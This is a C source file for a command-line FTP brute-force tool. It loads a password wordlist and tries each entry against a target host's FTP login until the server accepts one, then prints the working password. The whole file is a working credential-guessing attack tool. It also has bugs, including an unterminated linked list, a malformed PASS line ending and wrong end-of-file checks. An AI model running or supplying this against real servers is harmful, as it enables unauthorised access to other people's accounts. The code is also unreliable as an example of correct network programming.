/*
 *  FTP Brute Force
 *  Copyright (c) Houd <houd@houdhacks.info> 2014
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>


int port;
char* host;
int delay;
char* user;
char* password_file;
char* success_pass;
struct sockaddr_in sockaddr_;

int proccess_args(int argc, char* argv[]);
int verify_values();
int load_list();
int login();
int sreadl(int sockfd, void* buf);

struct password {
	char pstr[40];
	struct password* next;
};
struct password* root;

int main(int argc, char* argv[]) {
	if (argc == 1) {
		printf("Usage: ./ftp_brute \n");
		printf(
				"Options:\n-p <port>\n-h <host>(Ip only)\n-d <delay between tries>\n-u <username>\n-pass <password file>\n");
		goto bail;
	}
	if (proccess_args(argc, argv) == -1)
		goto bail;
	if (verify_values() == -1)
		goto bail;
	if (load_list() == -1)
		goto bail;
	if (login() == -1)
		goto bail;
	return 0;

	bail: fprintf(stderr, "Execution failed.\n");
	return 1;
}

int proccess_args(int argc, char* argv[]) {
	if (argc < 11) {
		return -1;
	}
	for (int i = 0; i < (argc - 1); i++) {
		if (!strcmp(argv[i], "-p")) {
			i++;
			port = atoi(argv[i]); // Covert string to int
		} else if (!strcmp(argv[i], "-d")) {
			i++;
			delay = atoi(argv[i]);
		} else if (!strcmp(argv[i], "-u")) {
			i++;
			user = argv[i];
		} else if (!strcmp(argv[i], "-h")) {
			i++;
			host = argv[i];
		} else if (!strcmp(argv[i], "-pass")) {
			i++;
			password_file = argv[i];
		}
	}
	return 0;
}
//
int verify_values() { //
	if (port == 0) {
		printf("There was no port defined... using port 21.\n");
		port = 21;
	}
	if (host == NULL) {
		printf("No host was defined\n");
		return -1;
	}
	if (password_file == NULL) {
		printf("No password file was defined.\n");
		return -1;
	}
	if (delay == 0) {
		printf("No delay was defined.. using 5\n");
		delay = 5;
	}
	memset(&sockaddr_, '0', sizeof(sockaddr_));
	if (inet_pton(AF_INET, host, &(sockaddr_.sin_addr)) == 0) {
		fprintf(stderr, "The ip given was invalid.\n");
		return -1;
	}
	return 0;
}

int load_list() {
	FILE* fh = fopen(password_file, "r");

	if (fh == NULL) {
		fprintf(stderr, "No such file or directory.\n");
		return -1;
	}

	size_t flen;
	fseek(fh, 0L, SEEK_END);
	flen = ftell(fh);
	rewind(fh);

	printf("Password list length: %d bytes\n", (int) flen);
	root = malloc(sizeof(struct password));

	struct password* curr = root;
	char pstr[40];
	printf("Loading word list, please wait this may take a while.\n");
	while (fgets(pstr, sizeof(pstr), fh) != NULL)
	{

		strcpy(curr->pstr, pstr); // Copy string pstr into curr->pstr
		curr->next = malloc(sizeof(struct password));
		curr = curr->next; // Change variable to next password
	}
	fclose(fh);
	printf("Word list loaded.\n");
	return 0;
}
int login() {
	sockaddr_.sin_family = AF_INET; // Sets to the AF layer of the OSI model to Internet protocol V4
	sockaddr_.sin_port = htons(port);
	struct password* curr = root;
	for (;;) // infinite for loop
			{
		printf("Attempting to connect...\n");
		int sockfd = 0;
		char recvbuf[1024]; // Max receive string 1024 bytes
		char outbuf[1024];
		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			fprintf(stderr, "Kernel did not allocate us a socket\n");
			return -1;
		}
		if (connect(sockfd, (struct sockaddr *) &sockaddr_, sizeof(sockaddr_))
				< 0)
				{
			fprintf(stderr,
					"Could not connect to host, Please check the address or if your delay is too low your IP could be blocked.\n");
			return -1;
		}
		printf("Connected...\n");
		int remaining = -1;
		while (remaining != 0) {
			bzero(recvbuf, sizeof(recvbuf));
			sreadl(sockfd, &recvbuf);
			printf("%s\n", recvbuf);
			ioctl(sockfd, FIONREAD, &remaining);
		}

		bzero(outbuf, sizeof(outbuf));
		int len = sprintf(outbuf, "USER %s\x0d\x0a", user);
		send(sockfd, (void*)&outbuf, len, 0);
		printf("%d:%s\n",len, outbuf);

		remaining = -1;
		while (remaining != 0) {
			bzero(recvbuf, sizeof(recvbuf));
			sreadl(sockfd, &recvbuf);
			printf("%s\n", recvbuf);
			ioctl(sockfd, FIONREAD, &remaining);
		}

		bzero(outbuf, sizeof(outbuf));
		len = sprintf(outbuf, "PASS %s\r", curr->pstr);
		send(sockfd, (void*)&outbuf, len, 0);
		printf("%s\n", outbuf);

		remaining = -1;
		while (remaining != 0) {
			bzero(recvbuf, sizeof(recvbuf));
			sreadl(sockfd, &recvbuf);
			printf("%s\n", recvbuf);
			if(recvbuf[0] == '5' && recvbuf[1] == '3' && recvbuf[2] == '0')
			{
				printf("===Auth Failure===\n");
				printf("Trying next password...\n");
			}
			else if(recvbuf[0] == '2' && recvbuf[1] == '3' && recvbuf[2] == '0'){
				printf("===Login Successful===\n");
				success_pass = curr->pstr;
				goto doublebreak;
			}
			ioctl(sockfd, FIONREAD, &remaining);
		}

		close(sockfd);
		curr = curr->next;
		sleep(delay); // Delay the users set time. - Just noticed it is in seconds not Mil haha
	}
	doublebreak:
	printf("Username: %s\n", user);
	printf("Successful pass: %s\n", success_pass);
	printf("Brute force done.\n");
	return 0;
}
int sreadl(int sockfd, void* buf) {
	char* line = buf;
	size_t index = 0;
	char c;
	for(;;)
	{
		size_t s = read(sockfd, &c, sizeof(c));
		if (s == EOF)
			break;
		if(c == '\r')
		{
			read(sockfd, &c, sizeof(c));
			if(c == '\n')
				break;
		}
		*line++ = c;
		index++;
	}
	*line++ = '\0';
	return 0;
}
